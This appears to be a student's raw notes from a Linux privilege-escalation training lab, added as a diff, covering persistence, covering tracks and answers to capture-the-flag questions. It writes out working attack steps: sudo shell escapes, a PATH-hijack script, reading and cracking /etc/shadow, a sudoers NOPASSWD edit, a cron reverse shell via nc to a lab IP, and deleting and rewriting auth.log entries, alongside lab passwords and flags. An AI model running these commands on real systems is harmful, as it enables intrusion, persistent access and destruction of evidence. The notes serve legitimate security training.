@@ -1,0 +1,292 @@
+#DAY 8 NOTES
+
+_____________________________________________________________________________________
+#PRIVILEGE ESCALATION,PERSISTENCE & COVERING YOU RTRACKS LINUX
+
+	Establish and maintain Linux persistence by:
+
+
+	    Adding or hijacking a user account
+	    Implementing boot process persistence
+	    Adding or modifying a CRON job
+	    Adding a kernel module (with a backdoor) <--- not in this class
+	    Additional methods outside the scope of the SG
+	    
+#PRIVILGE ESCALATION
+
+	sudo 
+		need sudo access priv escalation 
+	
+		sudo cat read etc shadow file see the password and crack it 
+		sudo apt download anything 
+		sudo vim priv esclation bin shell 
+			
+			
+#SUID/SGID
+
+	user and group ids 
+	suid allows run exe run as owner if root run it as root 
+	
+	sgid run as group
+	
+#Insecure Permissions
+
+	CRON <--- nc -lp exploit it 
+	World-Writable Files and Directories put everything in tmp
+	Dot '.' in PATH <--- script ls put in workingdirectory chmod +x 
+	
+#Vulnerable Software and Services
+
+	use imgiantio nto figure out how it works whatgs it doing 
+	linux command break it 
+
+#Covering your tracks 
+
+	logs plan to go around 
+	look at artifacts to find out whats going on 
+	class only systemD
+
+#Logs for Covering Tracks
+
+	Logs typically housed in /var/log & useful logs:
+
+
+	auth.log/secure - Logins/authentications
+
+	lastlog - Each users' last successful login time
+
+	btmp -  Bad login attempts
+
+	sulog - Usage of SU command
+
+	utmp - Currently logged in users (W command)
+
+	wtmp - Permanent record on user on/off
+
+	use tail head awk an dgrep to look at logs tail because probably recent 
+	
+#cleaning The Logs
+
+	Always work off a backup! 	
+    	 
+ 	GREP (Remove)   
+ 		
+		egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > 			auth.log; rm auth.log2
+	
+	SED (Replace)
+	
+		cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' 			auth.log2; cat auth.log2 > auth.log
+
+
+
+#Timestomp 
+
+	touch -c explicit 
+	touch -r refernce <-- better 
+	
+#Remote logging 
+
+	rsyslog
+	    Check the config!
+
+        Identify server being shipped to!
+
+        Identify which logs are being shipped
+
+    	[EMPHASIS]#Rsyslog? Need to be thorough!
+
+        New version references multiple files for rules
+
+	/etc/rsyslog.d/*
+	/etc/rsyslog.conf` <--- older version 
+	grep "IncludeConfig" /etc/rsyslog.conf
+
+#Reading Rsyslog
+
+    Utilizes severity (priority) and facility levels
+
+    Rules filter out, and can use keyword or number
+
+	<facility>.<priority>
+	
+	*rsyslog.com*
+
+	use current config not commented out 
+	
+------------------------------------------------------------------------------------	
+	
+#demo priv escalation
+
+	whoami && hostname <- after intial access
+	ways to get priv escaltion:
+	1.sudo -l <--- can run such thing as root for ex apt-get 
+		get the fuck out bins <- -website  <-- apt-get <-- sudo 
+			sudo apt-get chnagelog apt 
+			!/bin/bash
+			whoami 
+			root <-- privelege esclation 
+	
+	2.suid sgid bits
+		look for all three 2000 4000 6000 
+		find / -type f -perm /2000 @>/dev/null  <-- guid shows bin with 				guid set grab each name and put it in gtfobins look for 
+			guid if not keep moving top down. OR loook for obvious name 				to doesnt have info in gtfobins just break in ig
+			If nothing next technigque 
+			
+	3. dot path 
+	
+		the dot will already be their 
+		PATH=.:$PATH <- starts with a dot current working looks first 
+		ls -latr still works because nithing interffering in current 				working directory
+		vim ls: 
+			#!/bin/bash
+			echo "cracker"
+			cat /etc/passwd > goods.txt  
+			/bin/ls -latr /home/demo1 > home_dir.txt 
+			
+		ls -latr <-- vim not exectuable
+		chmod +x ls 
+		ls 
+		   cracker
+		/bin/ls -latr
+		
+	4.crack passwords 
+	
+		john the ripper in etc shadow password hashed 
+		zeus same as root crack that use zeus 
+		use password list rockyou.txt generally use what they give you
+		 which john
+		sudo apt install john
+		grabs ones interested in 
+		john --wordlist=passwords.txt shadow.txt
+		record password reord all passwords 
+		john shadow.txt --show 
+		try passwords you know 
+	
+	5.sudoing files 
+	
+		sudo vim /etc/sudoers 
+	
+	6.timstomping 
+		mp\n/tmp\n"|sort -R | head -n 1`;ls
+
+The flag is located in this users home directory.
+
+		/var/log
+		touch -t 0504134522 lastlog  
+		stat lastlog 
+		touch -r syslog lastlog 
+		stat lastlog 
+		
+	7.logs 
+		
+		sudo tail -n50 auth.log pids and timestomps three logs when log on 
+		
+__________________________________________________________________________________________
+
+#DAY 8 activties LINUX PRIVILEGE ESCALATION
+
+Scheme of Maneuver:
+>Jump Box cat "$LFILE"
+->Pivot:192.168.28.105 comrade :: StudentReconPassword 2222 PSP: rkhunter
+--->T1: 192.168.28.27 comrade :: StudentPrivPassword
+--->T2: 192.168.28.12	comrade :: StudentPrivPassword
+	
+	
+q1.True/False: If this file were named /etc/rsyslog.conf, would the configuration be a concern for us if we gained accessed through secure shell as an attacker?
+	
+		*.* action(type="omfwd" target="193.0.12.1" port="10514" protocol="udp")
+		remote logging to someone 
+		True
+	
+q2.Which rule will send a message to any logged in user?
+	
+	 	*.emerg				:omusrmsg:*
+		 	
+q3.Which active rule or rules is using a abnormal logging location?
+
+		local7.alert		        /var/tmp/boot.log
+	
+q4.What priority level will user facility log?
+
+		1.!crit,!debug,emerg,!info   -/var/log/user.log 0
+	
+q5.Is remote logging enabled?
+
+		Y
+		*.* action(type="omfwd" target="193.0.12.1" port="10514" protocol="udp")
+	
+q6.What servers could this system send logs to? (also consider commented entries)
+
+		# *.*       @@192.0.2.1:13232
+		*.* action(type="omfwd" target="193.0.12.1" port="10514" protocol="udp")
+		#*.* action(type="omfwd" target="192.0.42.1" port="1514" protocol="udp")
+
+q7.What transport layer protocol does @@ utilize for communications when remote logging?
+
+		tcp
+	
+q8.Which rules are inactive, what are their facilities?
+
+	 	auth, authpriv, cron, ftp, kern, lpr
+
+q9.There is a user on the system with the ability to sudo certain programs that has a '.' dot in their path and is navigating to and listing the contents of common world writable directories approximately every five minutes.
+The user's script is running like this:
+cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
+The flag is located in this users home directory.
+
+		go into tmp and write a script so when his script runs gives me what io 			wnat his home directory 
+		vim ls 
+		/bin/cat /home/billybob/f!@g1.txt > /tmp/home_dir2.txt
+		dxCAJqSPfmwd7ZKZbLvu
+
+q10.A command this user is able to sudo can be abused to obtain access as another user. This may take some research and effort to oan SUID or SGID binary on the system that can be abused to obtain root access. There isbtain root access with it.It is possible that your initial user does not have sudo privileges and that you will need to move laterally to another account.The flag can be found under the root profile directory
+
+		in the vim ls if run /usr/bin/sudo -l we see cat has all privs
+		theoricatcally can do this 
+		LFILE=file_to_read
+		sudo cat "$LFILE"
+		/usr/bin/sudo /bin/cat /etc/shadow > /tmp/passwdboi.txt
+		found that in gtfobins vuln cat billybob has sudo privs 
+		hopefully works we get passwd file and use john the rpper to crack it 
+		cat passwdboi.txt | grep zeus > zeus.txt
+		scp everything.txt student@10.50.34.194:/home/student
+		scp zeus.txt student@10.50.34.194:/home/student
+		john --wordlist=everything.txt zeus.txt <-- everything is password found 			in 					billbob home directory
+		ghjcnbnenrf      (zeus)
+		ssh -MS /tmp/T2 zeus@127.0.0.1 -p7010
+		ls -latr
+		cat F1aG+w0.txt
+		Pi4HXvYxI9uulRBqxP1G
+		
+	
+q11.There is an SUID or SGID binary on the system that can be abused to obtain root access. There is a flag in root’s home directory.
+
+		ssh-agent suid /usr/bin/ssh-agent
+		unknown /var/tmp/testbed/unknown
+		/usr/bin/ssh-agent /bin/bash -p <-- persistence i guess
+
+		./unknown /etc/sudoers "comrade ALL=(ALL) NOPASSWD:ALL
+		so obviously edit the suderos file who can sudo then us the binary
+		to append us to be able to sudo everything
+		sudo -l 
+		sudo cat /root/flag
+		jQCUXwJhLfKNKiSyPmmY
+		
+q12.Once you obtain root access, you are to implement persistence using a reverse bash shell via CRON.The IP address and port for the reverse shell will be supplied to you. IP: 192.168.28.135 Port: 33403 There are several CRON files you can use, so any one of them can be used. Your CRON job is to beacon out every minute. If it isn’t set to beacon every minute, you will not get the flag. Once completed, the flag will be placed in the /tmp directory.
+
+		in cron.d pop contest  
+		* * * * *   root   nc 192.168.28.135 33403 -e /bin/bash
+		cat /tmp/cron-flag.txt
+		2oo7LwquKAhT3pL47t0q
+
+q13.It has been decided that the first authentication event will be deleted, and the second authentication event will be modified to make it look as though the user came from the IPv4 address 192.168.1.103.Use auth log 
+
+	md5sum auth.log  ->>5feff04460d67d0139719503e72c8054  auth.log
+	remember to look at tmestamps to determine how mnay lines are one session also consists of a uathentication anda dissconnect.
+	
+______________________________________________________________________________________________________________________________________________________________
+
+
+
+
+
